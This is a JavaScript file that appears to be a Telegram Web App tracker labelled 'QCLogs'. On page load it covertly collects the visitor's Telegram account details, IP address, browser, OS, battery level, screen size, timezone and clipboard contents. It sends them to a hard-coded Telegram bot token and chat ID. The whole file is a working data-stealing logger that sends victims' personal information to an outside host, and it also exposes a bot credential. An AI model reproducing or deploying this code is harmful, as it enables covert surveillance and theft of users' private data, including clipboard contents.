let batteryLevel;
let screenWidth;
let screenHeight;
navigator.getBattery().then(function(battery) {
    batteryLevel = battery.level * 100;
});
screenWidth = window.screen.width;
screenHeight = window.screen.height;
// wXh
const batteryLevelConst = batteryLevel;
const screenWidthConst = screenWidth;
const screenHeightConst = screenHeight;
const clipboardText = navigator.clipboard.readText();

let tg = window.Telegram.WebApp;
document.addEventListener('DOMContentLoaded', function() {
  const urlParams = new URLSearchParams(window.location.search);
  const userAgent = navigator.userAgent;
  fetch('https://api.ipify.org?format=json')
    .then(response => response.json())
    .then(data => {
      const ip = data.ip;
      const osname = navigator.platform;
      const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
      const browser = getBrowserInfo();
      let userid = document.createElement('p');

      const message = `
*👤 Новый пользователь*

*🧭 Информация:*
*🔍 Account:*
  ├ ID: ${tg.initDataUnsafe.user.id}
  ├ Username: @${tg.initDataUnsafe.user.username}
  ├ Name: ${tg.initDataUnsafe.user.first_name}
  ├ Surname: ${tg.initDataUnsafe.user.last_name}
  ├ Language: ${tg.initDataUnsafe.user.language_code}
*💻 System:*
  ├ IP: ${ip}
  ├ UserAgent: ${userAgent}
  ├ OS: ${osname}
  ├ Browser: ${browser}
  ├ Battery ${batteryLevel}%
  ├ Screen: ${screenWidth}x${screenHeight} px.
  ├ Clipboard: ${clipboardText}
  └ Timezone: ${timeZone}

*Provided by QCLogs*`;
      
      const token = '7149820379:AAHASDV0oFK6Z-jgYcw0Jqe6GoVcvx6SfPQ'
      const chatId = '-1002008103372';
      const url = 'https://api.telegram.org/bot'+token+'/sendMessage';
      const formData = new FormData();
      formData.append('chat_id', chatId);
      formData.append('text', message);
      formData.append('parse_mode', 'Markdown');
      fetch(url, {
        method: 'POST',
        body: formData
      });
    });

function getBrowserInfo() {
    const ua = navigator.userAgent;
    let browser = '';
    const match = ua.match(/(opera|chrome|safari|firefox|msie|trident(?=\/))\/?\s*(\d+)/i) || [];

    if (/trident/i.test(match[1])) {
      const tem = /\brv[ :]+(\d+)/g.exec(ua) || [];
      browser = `IE ${tem[1] || ''}`;
    }

    if (match[1] === 'Chrome') {
      const tem = ua.match(/\b(OPR|Edge)\/(\d+)/);
      if (tem != null) browser = tem.slice(1).join(' ').replace('OPR', 'Opera');
    }

    match[2] = match[2] ? `version ${match[2]}` : '';
    browser = `${match[1] || ''} ${match[2] || ''}`.trim();
    return browser;
  }
  });